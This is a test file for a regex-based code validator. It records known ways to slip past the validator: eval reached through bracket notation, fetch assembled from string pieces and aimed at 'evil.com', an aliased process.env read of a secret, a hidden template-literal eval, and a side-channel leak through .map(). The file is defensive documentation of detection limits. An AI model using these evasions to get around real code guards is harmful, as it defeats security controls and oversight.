import { describe, it, expect } from "vitest";
import { guard } from "../src/engine.js";
import { Verdict } from "../src/types.js";
import type { CodeSubmission } from "../src/types.js";

/**
 * These tests document KNOWN LIMITATIONS of the regex-based validator.
 * TACIT is a best-effort lint pass, NOT a security boundary.
 * The actual security boundary is the ComputeSubstrate sandbox.
 *
 * Each test demonstrates an evasion technique that bypasses pattern validation.
 * They are marked with expected behavior (bypass succeeds) to prevent regressions
 * if we later add AST-based detection.
 */

function submission(code: string): CodeSubmission {
  return { code, language: "typescript", sessionId: "test", capabilities: [] };
}

describe("known evasion techniques (documenting limitations)", () => {
  describe("bracket notation bypasses", () => {
    it("eval via bracket notation is NOT caught (known limitation)", () => {
      const code = `const fn = globalThis["eval"]; fn("1+1");`;
      const result = guard(submission(code));
      // globalThis triggers a warning, but eval() call is not detected
      expect(result.validationErrors.some((v) => v.rule === "no-eval")).toBe(false);
    });

    it("fetch via string concatenation is NOT caught (known limitation)", () => {
      const code = `const f = globalThis["fet" + "ch"]; await f("https://evil.com");`;
      const result = guard(submission(code));
      expect(result.validationErrors.some((v) => v.rule === "no-direct-fetch")).toBe(false);
    });
  });

  describe("variable aliasing bypasses", () => {
    it("process aliased to variable is NOT caught (known limitation)", () => {
      const code = `const p = process; const key = p.env.SECRET;`;
      const result = guard(submission(code));
      // "process.env" pattern matches the second line, but "p.env" would not
      // In this case process.env IS on the second statement so it's caught
      // But aliased access without .env on same line would not be
      const aliased = `const p = process;\nconst key = p.env.SECRET;`;
      const result2 = guard(submission(aliased));
      expect(result2.validationErrors.some((v) => v.rule === "no-process-env")).toBe(false);
    });
  });

  describe("template literal expression hiding", () => {
    it("eval inside template expression IS hidden by string stripping (known limitation)", () => {
      const code = "const x = `${eval('malicious')}`;";
      const result = guard(submission(code));
      // stripStringLiterals removes the entire template literal including ${} contents
      expect(result.validationErrors.some((v) => v.rule === "no-eval")).toBe(false);
    });
  });

  describe("Function constructor without new keyword", () => {
    it("Function() without 'new' keyword is NOT caught (known limitation)", () => {
      const code = `const F = Function; const evil = F("return this")();`;
      const result = guard(submission(code));
      // Pattern only matches "new Function(" — bare Function reference is not caught
      expect(result.validationErrors.some((v) => v.rule === "no-new-function")).toBe(false);
    });
  });

  describe("classified leak via .map() side effects", () => {
    it(".map() with impure closure is NOT detected as leak (known limitation)", () => {
      const code = `
        const secret = classify("key");
        let exfiltrated = "";
        secret.map(v => { exfiltrated = v; return v; });
      `;
      const result = guard(submission(code));
      // .map() is explicitly whitelisted in the leak detector
      expect(result.classifiedLeaks.length).toBe(0);
    });
  });

  describe("patterns that SHOULD be caught (regression tests)", () => {
    it("direct eval() is caught", () => {
      const result = guard(submission(`eval("code")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("direct fetch() is caught", () => {
      const result = guard(submission(`fetch("https://api.com")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("new Function() is caught", () => {
      const result = guard(submission(`new Function("return this")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("require() is caught", () => {
      const result = guard(submission(`require("child_process")`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("Proxy is caught", () => {
      const result = guard(submission(`const p = new Proxy(obj, handler)`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });

    it("Object.defineProperty is caught", () => {
      const result = guard(submission(`Object.defineProperty(obj, "key", { value: 1 })`));
      expect(Verdict.isDeny(result.verdict)).toBe(true);
    });
  });
});
